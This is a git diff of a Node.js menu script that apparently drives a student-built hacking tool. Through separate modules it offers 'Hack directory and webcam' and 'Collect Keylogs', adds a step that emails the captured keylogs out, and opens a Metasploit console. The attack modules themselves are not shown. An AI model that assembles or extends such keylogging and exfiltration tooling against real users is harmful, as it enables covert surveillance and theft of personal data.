@@ -1,8 +1,9 @@
 const inquirer = require("inquirer");
 const { exec } = require("child_process");
 const directoryHack = require("./Directory_Hack");
-<<<<<<< HEAD
 const keyLogger = require("./Keylogger");
+const emailService = require("./Email_Service");
+
 // TODO Program should set parameters and open clien within terminal
 inquirer
   .prompt([
@@ -16,11 +17,11 @@ inquirer
   .then((answers) => {
     if (answers.action === "Hack directory and webcam") {
       directoryHack.hack(exec);
-    } else if (answers. action === "Collect Keylogs"){
+    } else if (answers.action === "Collect Keylogs"){
       keyLogger.hack(exec);
+      emailService.send(exec);
     }
   });
-=======
 const Q = require("q");
 const { openConsole } = require("./OpenMsfConsole");
 
@@ -48,4 +49,3 @@ const main = () => {
 };
 
 main();
->>>>>>> 551d47340bd0e45d7e15329c8d0ac0c842fd9d04
